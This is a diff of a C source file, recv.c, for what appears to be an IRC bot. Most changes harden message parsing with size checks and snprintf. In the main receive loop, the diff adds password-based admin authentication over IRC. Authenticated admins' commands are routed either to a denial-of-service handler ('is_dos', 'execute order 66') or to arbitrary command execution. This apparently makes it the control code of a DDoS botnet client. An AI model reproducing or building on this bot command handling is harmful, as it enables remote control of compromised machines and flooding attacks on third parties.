@@ -1,7 +1,7 @@
 /*
- * Author           : 93aef0ce4dd141ece6f5
- * Title            : recv.c
- * Description      : functions which concern receiving
+ *   Author           : 93aef0ce4dd141ece6f5
+ *   Title            : recv.c
+ *   Description      : functions which concern receiving
  *                    and received data go here.
  *
  *   Copyright (C) 2016  93aef0ce4dd141ece6f5
@@ -53,7 +53,7 @@ int cleanup (SOCKET s, pAccount a, pMessage m) {
     // free heap allocs
     if (a != NULL) {
         int i;
-        for (i = 0; i < a->admin_size; i++) {
+        for (i = 0; i < a->num_admins; i++) {
             free (a->admins[i]);
         }
         free (a->admins);
@@ -103,21 +103,22 @@ int cleanup (SOCKET s, pAccount a, pMessage m) {
  * messages from IRC
  */
 static void extract (pMessage m, char *s) {
-    char *token;
+    char *token = NULL;
     const char delims[] = " !:";
 
     /*
      * extract the user's message
      */
     if ((token = strstr (s+1, ":")) != NULL) {
-        if (strlen (token) > m->msgSize) {
+        if (strlen (token) >= m->msgSize) {
             m->msg = realloc (m->msg, m->msgSize*2);
             m->msgSize *= 2;
-        } else if ((strlen (token)*2) < m->msgSize && m->msgSize > DEFAULT_MALLOC_SIZE) {
+        } else if ((strlen (token)*2) < m->msgSize 
+                    && m->msgSize > DEFAULT_MALLOC_SIZE) {
             m->msg = realloc (m->msg, m->msgSize/2);
             m->msgSize /= 2;
         }
-        strncpy (m->msg, token+1, m->msgSize-1);
+        snprintf (m->msg, m->msgSize, "%s", token+1);
     }
 
     /*
@@ -137,13 +138,14 @@ static void extract (pMessage m, char *s) {
     }
 
     /* 
-     * extract the channel or user (from pm)
+     * extract the channel (or user from pm)
      */
     if ((token = strtok (NULL, delims)) != NULL) {
-        if (strlen (token) > m->contactSize) {
+        if (strlen (token) >= m->contactSize) {
             m->contact = realloc (m->contact, m->contactSize*2);
             m->contactSize *= 2;
-        } else if ((strlen (token)*2) < m->contactSize && m->contactSize > DEFAULT_MALLOC_SIZE) {
+        } else if ((strlen (token)*2) < m->contactSize 
+                    && m->contactSize > DEFAULT_MALLOC_SIZE) {
             m->contact = realloc (m->contact, m->contactSize/2);
             m->contactSize /= 2;
         }
@@ -154,10 +156,11 @@ static void extract (pMessage m, char *s) {
      * extract the first word of user's message
      */
     if ((token = strtok (NULL, delims)) != NULL) {
-        if (strlen (token) > m->commandSize) {
+        if (strlen (token) >= m->commandSize) {
             m->command = realloc (m->command, m->commandSize*2);
             m->commandSize *= 2;
-        } else if ((strlen (token)*2) < m->commandSize && m->commandSize > DEFAULT_MALLOC_SIZE) {
+        } else if ((strlen (token)*2) < m->commandSize 
+                    && m->commandSize > DEFAULT_MALLOC_SIZE) {
             m->command = realloc (m->command, m->commandSize/2);
             m->commandSize /= 2;
         }
@@ -168,10 +171,11 @@ static void extract (pMessage m, char *s) {
      * extract the second word of user's message
      */
     if ((token = strtok (NULL, delims)) != NULL) {
-        if (strlen (token) > m->paramSize) {
+        if (strlen (token) >= m->paramSize) {
             m->param = realloc (m->param, m->paramSize*2);
             m->paramSize *= 2;
-        } else if ((strlen (token)*2) < m->paramSize && m->paramSize > DEFAULT_MALLOC_SIZE) {
+        } else if ((strlen (token)*2) < m->paramSize 
+                    && m->paramSize > DEFAULT_MALLOC_SIZE) {
             m->param = realloc (m->param, m->paramSize/2);
             m->paramSize /= 2;
         }
@@ -209,6 +213,7 @@ void start_recv (SOCKET s, pAccount account) {
             printf ("%s", output);
             // extract elements from messages
             extract (message, output);
+            // trim strings and lower all chars
             format_message (message);
 
             if (strncmp (message->command, "$", 1) == 0) {
@@ -216,23 +221,32 @@ void start_recv (SOCKET s, pAccount account) {
                 if (strncmp (message->command, "$authenticate", 13) == 0) {
                     // check password
                     if (check_pass (message->param)) {
-                        printf ("Pass is correct\n");
                         if (add_admin (account, message)) {
-                            int i;
-                            for (i = 0; i < account->num_admins; i++) {
-                                printf ("Admin[%d]: %s\n", i, account->admins[i]);
+                            // send message that user has been authenticated
+                            const char *contact = message->contact;
+                            if (strcmp (contact, account->n_name) == 0) {
+                                contact = message->n_name;
                             }
+
+                            my_send (s, "PRIVMSG %s :%s has been authenticated.\r\n", 
+                                    contact, message->n_name);
                         } else {
                             // admin list expansion error
                             non_fatal ("Admin array realloc");
                         }
                     } else {
                         // deny access
-                        printf ("Pass is incorrect\n");
                     }
                 // check if user is admin
                 } else if (is_admin (account, message)) {
-                    // execute order 66
+                    if (is_dos (message->command)) {
+                        // execute order 66
+                        if (parse_args (s, message) == FALSE) {
+                            printf ("parse_args err\n");
+                        }
+                    } else {
+                        execute_command (s, account, message);
+                    }
                 } else {
                     // deny access
                 }
